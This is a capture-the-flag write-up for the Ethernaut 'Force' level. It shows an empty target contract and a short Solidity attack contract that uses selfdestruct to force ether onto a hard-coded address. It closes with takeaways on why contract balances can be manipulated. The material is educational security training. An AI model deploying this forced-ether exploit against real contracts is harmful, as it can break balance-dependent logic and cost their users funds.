## Challenge
~~~
Some contracts will simply not take your money `¯\_(ツ)_/¯`

The goal of this level is to make the balance of the contract greater than zero.

  Things that might help:

- Fallback methods
- Sometimes the best way to attack a contract is with another contract.
- See the ["?"](https://ethernaut.openzeppelin.com/help) page above, section "Beyond the console"
~~~
## Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```
`

## Solution

```
//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Attack {
    address constant TARGET = 0x994210f6Ae50a69DB8889Ddab88b867bE9D8b86f;
    constructor() payable {
    }
    
    function attack() external payable {
        selfdestruct(payable (TARGET));
    }
}
```

## Key takeaways and useful resources

Few ways a contract can have ether associated with it:
 - have a receive() function
 - be sent ether when initialized (payable constructor)
 - if this contract is designated for the remaining ether of a deleted contract.
   
This is why we should never depened on the `address(this).balance` as this can be manipulated.



